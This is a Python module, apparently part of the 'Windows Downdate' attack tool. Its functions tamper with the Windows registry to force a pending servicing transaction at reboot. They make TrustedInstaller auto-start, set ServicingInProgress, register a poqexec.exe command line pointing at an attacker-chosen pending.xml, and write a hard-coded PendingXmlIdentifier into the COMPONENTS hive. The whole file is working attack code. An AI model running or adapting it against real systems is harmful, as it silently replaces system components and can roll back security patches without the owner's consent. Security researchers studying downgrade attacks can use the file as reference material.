import os
import winreg

import win32service

from windows_downdate.component_store_utils import load_components_hive
from windows_downdate.registry_utils import set_reg_value
from windows_downdate.service_utils import set_service_start_type
from windows_downdate.winlogon_utils import set_winlogon_notification_event
from windows_downdate.xml_utils import load_xml_from_buffer, ET

CBS_REGISTRY_PATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing"

SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\\Configuration"

POQEXEC_PATH = "%SystemRoot%\\System32\\poqexec.exe"


EMPTY_PENDING_XML = """<?xml version='1.0' encoding='utf-8'?>
<PendingTransaction Version="3.1" WcpVersion="10.0.22621.2567 (WinBuild.160101.0800)" Identifier="916ae75edb30da0146730000dc1be027">
\t<Transactions>
\t</Transactions>
\t<ChangeList>
\t</ChangeList>
\t<POQ postAction="reboot">
\t</POQ>
\t<POQ>
\t</POQ>
\t<InstallerQueue Length="0x00000000">
\t</InstallerQueue>
\t<RollbackInformation>
\t\t<AdminHints>
\t\t</AdminHints>
\t</RollbackInformation>
</PendingTransaction>"""


def get_empty_pending_xml() -> ET.ElementTree:
    return load_xml_from_buffer(EMPTY_PENDING_XML)


def set_trusted_installer_auto_start() -> None:
    set_service_start_type("TrustedInstaller", win32service.SERVICE_AUTO_START)


def register_winlogon_notification() -> None:
    set_winlogon_notification_event("TrustedInstaller", "CreateSession")


def set_servicing_in_progress() -> None:
    cbs_interface_registry_path = f"{CBS_REGISTRY_PATH}\\Interface"
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  cbs_interface_registry_path,
                  "ServicingInProgress",
                  1, winreg.REG_DWORD)


def register_poqexec_cmd(poqexec_cmd: str) -> None:
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH,
                  "PoqexecCmdline",
                  [poqexec_cmd],
                  winreg.REG_MULTI_SZ)


def set_pending_xml_identifier(pending_xml_identifier: bytes) -> None:
    # TODO: Theres gotta be a better way
    pending_xml_identifier_unicode = b"\x00".join(bytes([byte]) for byte in pending_xml_identifier) + b"\x00"
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  "COMPONENTS",
                  "PendingXmlIdentifier",
                  pending_xml_identifier_unicode,
                  winreg.REG_BINARY)


def pend_update(pending_xml_path: str) -> None:
    set_trusted_installer_auto_start()

    # Requires TrustedInstaller, can be skipped
    register_winlogon_notification()

    # Requires TrustedInstaller, can be skipped
    set_servicing_in_progress()

    poqexec_path_exp = os.path.expandvars(POQEXEC_PATH)
    poqexec_cmd = f"{poqexec_path_exp} /display_progress {pending_xml_path}"
    register_poqexec_cmd(poqexec_cmd)

    load_components_hive()

    # TODO: Load identifier in runtime
    pending_xml_identifier = b"916ae75edb30da0146730000dc1be027"
    set_pending_xml_identifier(pending_xml_identifier)